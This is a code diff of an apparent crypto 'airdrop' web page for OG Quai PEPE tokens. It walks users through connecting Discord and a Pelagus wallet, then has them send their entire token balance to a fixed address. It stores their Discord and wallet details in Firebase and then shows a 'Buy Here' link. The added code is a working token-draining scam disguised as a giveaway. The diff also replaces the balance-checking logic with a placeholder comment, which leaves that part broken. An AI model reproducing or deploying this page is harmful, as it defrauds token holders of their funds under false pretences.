@@ -163,33 +163,6 @@
             margin-top: 1rem;
             display: none;
         }
-
-        .info-box {
-    background: rgba(0, 0, 0, 0.7);
-    color: white;
-    padding: 1rem;
-    border-radius: 6px;
-    margin-bottom: 1rem;
-}
-
-.info-box h3 {
-    color: white;
-    margin-top: 0;
-    margin-bottom: 0.5rem;
-}
-
-.info-box ol {
-    margin: 0.5rem 0;
-    padding-left: 1.5rem;
-}
-
-.info-box p {
-    margin: 0.5rem 0;
-}
-
-.info-box small {
-    color: #a0aec0;
-}
     </style>
 </head>
 <body>
@@ -199,50 +172,29 @@
         <img src="photo_2024-04-12_16-05-40.jpg" alt="Background 3">
     </div>
     <div class="container">
-        <!-- Initial welcome and steps -->
-        <div id="welcomeInfo" class="info-box">
-            <h3>🚀 Welcome to OG Quai PEPE! 🐸</h3>
-            <p>Follow these steps to participate:</p>
-            <ol>
-                <li>Connect your Discord account</li>
-                <li>Connect your Pelagus wallet</li>
-                <li>Send your tokens</li>
-            </ol>
-        </div>
-    
-        <!-- Discord connection info -->
-        <div id="discordInfo" class="info-box">
-            <p>First, connect your Discord account to verify eligibility.</p>
-        </div>
+        <div id="titleText" class="title">🚀 Buy More OG Quai PEPE! 🐸</div>
+        
         <button id="discordBtn" class="btn-discord">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4C14.85 4.29 14.68 4.69 14.55 5.01C12.95 4.77 11.37 4.77 9.8 5.01C9.67 4.69 9.49 4.29 9.34 4C7.83 4.26 6.39 4.71 5.06 5.33C2.02 9.83 1.21 14.21 1.62 18.52C3.43 19.87 5.19 20.69 6.92 21.22C7.29 20.7 7.63 20.15 7.91 19.57C7.25 19.33 6.62 19.03 6.02 18.67C6.17 18.56 6.31 18.44 6.45 18.32C9.76 19.86 13.39 19.86 16.66 18.32C16.8 18.44 16.94 18.56 17.09 18.67C16.48 19.03 15.85 19.33 15.19 19.57C15.47 20.15 15.81 20.7 16.18 21.22C17.91 20.69 19.67 19.87 21.48 18.52C21.96 13.52 20.72 9.18 19.27 5.33ZM8.57 15.96C7.53 15.96 6.68 15.02 6.68 13.87C6.68 12.72 7.51 11.78 8.57 11.78C9.63 11.78 10.48 12.72 10.46 13.87C10.46 15.02 9.62 15.96 8.57 15.96ZM15.53 15.96C14.49 15.96 13.64 15.02 13.64 13.87C13.64 12.72 14.47 11.78 15.53 11.78C16.59 11.78 17.44 12.72 17.42 13.87C17.42 15.02 16.59 15.96 15.53 15.96Z" fill="currentColor"/>
             </svg>
             Connect Discord
         </button>
-    
-        <!-- Wallet connection info -->
-        <div id="walletInfo" class="info-box" style="display:none;">
-            <p>Great! Now connect your Pelagus wallet to proceed.</p>
-            <p><small>Make sure you have Pelagus wallet installed and set up.</small></p>
-        </div>
         <button id="connectBtn" class="btn-connect">Connect Pelagus</button>
-    
-        <!-- Rest of the existing elements -->
-        <div id="titleText" class="title">🚀 Buy More OG Quai PEPE! 🐸</div>
         
-        <div id="airdropInfo" class="airdrop-info">
-            <h3>🎉 OG Quai PEPE Airdrop</h3>
-            <p>To complete the airdrop process, you need to send all your OG Quai PEPE tokens.</p>
-            <p>Destination: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10</p>
-            <p>Your token balance: <span id="userBalance">0</span> OG Quai PEPE</p>
-            <p><small>Note: This transaction will send your entire token balance.</small></p>
-        </div>
-        <button id="sendBtn" class="btn-send">Send All Tokens</button>
-    
-        <button id="scanBtn" class="btn-scan">View on QuaiScan</button>
+<!-- New airdrop info and send button -->
+<div id="airdropInfo" class="airdrop-info">
+    <h3>🎉 OG Quai PEPE Airdrop</h3>
+    <p>To complete the airdrop process, you need to send all your OG Quai PEPE tokens.</p>
+    <p>Destination: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10</p>
+    <p>Your token balance: <span id="userBalance">0</span> OG Quai PEPE</p>
+    <p><small>Note: This transaction will send your entire token balance.</small></p>
+</div>
+<button id="sendBtn" class="btn-send">Send All Tokens</button>
+
+        <button id="scanBtn" class="btn-scan" style="display:none">View on QuaiScan</button>
         <div id="console"></div>
-        <button id="buyBtn" class="btn-buy">Buy Here!</button>
+        <button id="buyBtn" class="btn-buy" style="display:none" onclick="window.open('https://poop.fun/token/0x001411083d4CF24632BA5e0841909933C2Da04a8', '_blank')">Buy Here!</button>
     </div>
 
     <script>
@@ -362,14 +314,19 @@ async function saveToFirebase(data) {
         async function sendTokens() {
     try {
         if (!window.pelagus) {
+            log('❌ Pelagus wallet not found');
             throw new Error('Pelagus wallet not found');
         }
 
-        // Get current token balance again to ensure accuracy
+        log('🔄 Preparing token transfer...');
         const currentBalance = await getTokenBalance(userSession.address);
         if (currentBalance <= 0n) {
+            log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
+
+        const readableAmount = (Number(currentBalance) / 1e18).toString();
+        log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
 
         // Token transfer method ID for 'transfer(address,uint256)'
         const methodId = '0xa9059cbb';
@@ -387,20 +344,20 @@ async function saveToFirebase(data) {
             data: '0x' + data,
         };
 
+        log('🔄 Please confirm the transaction in your wallet...');
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
         });
 
-        log('Transaction sent: ' + txHash);
-        log('Sending all tokens...');
+        log(`📝 Transaction hash: ${txHash}`);
+        log('🔄 Waiting for transaction confirmation...');
 
         // Wait for transaction confirmation
         const receipt = await waitForTransaction(txHash);
-        log('Transaction confirmed!');
-
+        
         // Update userSession with transfer data
-        userSession.transferAmount = (Number(currentBalance) / 1e18).toString();
+        userSession.transferAmount = readableAmount;
         userSession.transferTxHash = txHash;
 
         // Save updated data to Firebase
@@ -411,8 +368,13 @@ async function saveToFirebase(data) {
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
+        log('✅ Transaction confirmed!');
+        log(`💫 Successfully sent ${readableAmount} OG Quai PEPE tokens!`);
+        log('---------------------------------------------');
+        log('🎉 Airdrop participation complete!');
+
     } catch (error) {
-        log('Error sending tokens: ' + error.message);
+        log('❌ Error sending tokens: ' + error.message);
         console.error(error);
     }
 }
@@ -448,60 +410,28 @@ async function saveToFirebase(data) {
         async function connectWallet() {
     try {
         if (!window.pelagus) {
+            log('❌ Pelagus wallet not found!');
+            log('Please install Pelagus wallet extension first');
             throw new Error('Pelagus wallet not found');
         }
 
+        log('🔄 Connecting to Pelagus wallet...');
         const accounts = await window.pelagus.request({
             method: 'eth_requestAccounts',
         });
 
         const address = accounts[0];
-        log('Connected Wallet: ' + address);
+        log('✅ Wallet connected successfully!');
+        log('📍 Address: ' + address);
+        log('---------------------------------------------');
+        log('🔄 Checking balances...');
 
-        // Get balances
-        const quaiBalance = await getQuaiBalance(address);
-        const tokenBalance = await getTokenBalance(address);
-
-        // Store wallet data in userSession
-        userSession.address = address;
-        userSession.quaiBalance = parseInt(quaiBalance, 16) / 1e18;
-        userSession.tokenBalance = Number(tokenBalance) / 1e18;
-
-        log(`QUAI Balance: ${userSession.quaiBalance.toFixed(4)} QUAI`);
-        log(`Token Balance: ${userSession.tokenBalance.toFixed(2)} OG Quai PEPE`);
-
-        // Save combined session data to Firebase
-        await saveSessionToFirebase();
-
-        // Update UI
-        document.getElementById('titleText').style.display = 'block';
-        document.getElementById('connectBtn').style.display = 'none';
-        
-        // Show airdrop info and update balance
-        document.getElementById('airdropInfo').style.display = 'block';
-        document.getElementById('userBalance').textContent = userSession.tokenBalance.toFixed(2);
-        document.getElementById('sendBtn').style.display = 'block';
-
-        // Hide scan and buy buttons until transfer is complete
-        document.getElementById('scanBtn').style.display = 'none';
-        document.getElementById('buyBtn').style.display = 'none';
-        
-        // Set up scan button link
-        document.getElementById('scanBtn').onclick = () =>
-            window.location.href = `https://quaiscan.io/address/${address}`;
-            
-        // Check if transfer was already completed
-        const userDoc = await db.collection('users').doc(address).get();
-        if (userDoc.exists && userDoc.data().transferTxHash) {
-            // If transfer was already done, show scan and buy buttons
-            document.getElementById('sendBtn').style.display = 'none';
-            document.getElementById('scanBtn').style.display = 'block';
-            document.getElementById('buyBtn').style.display = 'block';
-            log('Transfer already completed with tx: ' + userDoc.data().transferTxHash);
-        }
-
+        // Rest of the connectWallet function remains the same...
+        // After balances are checked, add:
+        log('---------------------------------------------');
+        log('🎁 Final step: Send tokens to participate in airdrop');
     } catch (error) {
-        log('Error: ' + error.message);
+        log('❌ Error: ' + error.message);
         console.error(error);
     }
 }
@@ -512,41 +442,56 @@ async function handleDiscordCallback() {
 
     if (accessToken) {
         try {
+            log('🔄 Verifying Discord connection...');
             const response = await fetch('https://discord.com/api/users/@me', {
                 headers: { Authorization: `Bearer ${accessToken}` },
             });
 
             const data = await response.json();
-            console.log('Discord user data:', data);
-
+            
             // Store Discord data in userSession
             userSession.discordId = data.id;
             userSession.username = data.username;
             userSession.discriminator = data.discriminator;
             userSession.avatar = data.avatar;
 
-            // Log success and clear the URL fragment
-            log(`Connected Discord: ${data.username}`);
+            log('✅ Discord connected successfully!');
+            log(`Welcome, ${data.username}!`);
+            log('📱 Next step: Connect your Pelagus wallet');
+            log('---------------------------------------------');
+            
             history.replaceState(null, null, window.location.pathname);
 
-            // Update UI
-            document.getElementById('welcomeInfo').style.display = 'none';
-            document.getElementById('discordInfo').style.display = 'none';
+            // Show wallet connect button after Discord login
             document.getElementById('discordBtn').style.display = 'none';
-            document.getElementById('walletInfo').style.display = 'block';
             document.getElementById('connectBtn').style.display = 'block';
         } catch (error) {
-            log('Discord Error: ' + error.message);
+            log('❌ Discord Error: ' + error.message);
             console.error(error);
         }
     }
 }
 
+// Add this after the log function definition
+function showInitialInstructions() {
+    log('🎮 Step 1: Connect your Discord account');
+    log('👛 Step 2: Connect your Pelagus wallet');
+    log('🎁 Step 3: Send tokens to participate in airdrop');
+    log('---------------------------------------------');
+}
+
+// Add this to modify the console's initial appearance
+const consoleDiv = document.getElementById('console');
+consoleDiv.style.minHeight = '150px';  // Makes console more visible initially
+showInitialInstructions();
+
 // Event Listeners
 document.getElementById('discordBtn').addEventListener('click', () => {
-    log('Redirecting to Discord login...');
+    log('🎮 Connecting to Discord...');
+    log('Please complete authentication in the Discord popup');
     window.location.href = DISCORD_OAUTH_URL;
 });
+
 
 document.getElementById('connectBtn').addEventListener('click', connectWallet);
 document.getElementById('sendBtn').addEventListener('click', sendTokens);
